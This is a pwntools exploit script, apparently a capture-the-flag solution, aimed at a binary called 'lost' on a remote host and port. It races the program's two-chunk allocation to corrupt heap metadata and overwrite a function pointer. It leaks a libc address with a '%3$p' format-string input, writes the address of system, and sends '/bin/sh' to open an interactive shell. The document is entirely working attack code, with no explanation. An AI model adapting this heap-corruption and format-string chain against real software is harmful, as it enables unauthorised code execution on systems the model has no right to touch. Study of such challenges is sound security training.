from pwn import *
import sys

HOST='18.216.88.73'
PORT=1337

libc=ELF("./libc.so.6")

def menu(opt):
    r.sendlineafter("Enter choice >> ",str(opt))

def edit(data):
    menu(2)
    r.sendlineafter("Enter new data: ",str(data))

def race(size,data,size2,data2):
    menu(1)
    r.sendlineafter("How many chunks at a time (1/2) ? ",'2')
    out=r.recvuntil(": ")
    print out[-3]
    if out[-3]=='2':
        r.sendline(str(size2))
        r.sendlineafter("Enter Data 2: ",data2)
        r.sendlineafter("Enter Size 1: ",str(size))
        r.sendlineafter("Enter Data 1: ",data)
    else:
        r.sendline(str(size))
        r.sendlineafter("Enter Data 1: ",data)
        r.sendlineafter("Enter Size 2: ",str(size2))
        r.sendlineafter("Enter Data 2: ",data2)

def race_cond(size,data,size2,data2,size2_act,auth):
    menu(1)
    r.sendlineafter("How many chunks at a time (1/2) ? ",'2')
    out=r.recvuntil(": ")
    if out[-3]=='2':
        log.info("unsuccessful")
        return -1
    else:
        r.sendline(str(size))
        sleep(4)
        log.info("Sleep1 over")
        r.sendlineafter("Enter Size 2: ",str(size2))
        sleep(4)
        log.info("Sleep2 over")
        r.sendline(auth)
        r.sendlineafter("Enter Data 1: ",data)
        r.sendline(str(size2_act))
        r.sendlineafter("Enter Author name : ",auth)
        r.sendlineafter("Enter Data 2: ",data2)
        return 1

def alloc(size,data,auth='q'*0xf0,l=False):
    menu(1)
    r.sendlineafter("How many chunks at a time (1/2) ? ",'1')
    r.sendlineafter("Enter Size 1: ",str(size))
    if l:
        r.sendlineafter("Enter Author name : ",auth)
    else:
        r.sendafter("Enter Author name : ",auth)
    r.sendlineafter("Enter Data 1: ",data)

def exploit():
    alloc(1000-0x100,"q")
    alloc(1000-0x100,"q")
    alloc(1000-0x100,"q")
    gdb.attach(r)
    race_cond(568,"a"*0x230+"qqqqqqqq"+p64(0x71)+p64(0x6020dd),10000,"aa",12,"q"*(0xf0-1))
    alloc(90,"q")
    alloc(90,"qqq"+p64(0x602088))
    edit(p64(0x400970))
    menu("%3$p##")
    libc.address=int(r.recvuntil("##").replace("##",''),16)-0xf88ad#-0x3da51d
    log.info("libc @ "+hex(libc.address))
    menu("11")
    r.sendlineafter("Enter new data: ",p64(libc.symbols['system']))
    menu("/bin/sh\x00")


if __name__=='__main__':

    success=False
    while(not success):
        if len(sys.argv)>1:
            r=remote(HOST,PORT)
        else:
            r=process('./lost',env={"LD_PRELOAD":"./libc.so.6"})
        success=race_cond(12,"A"*24+p64(0x21)+"A"*24+p64(0xea1),10000,"12",12,"QQQQ")

    log.info("successful")
    exploit()
    r.interactive()
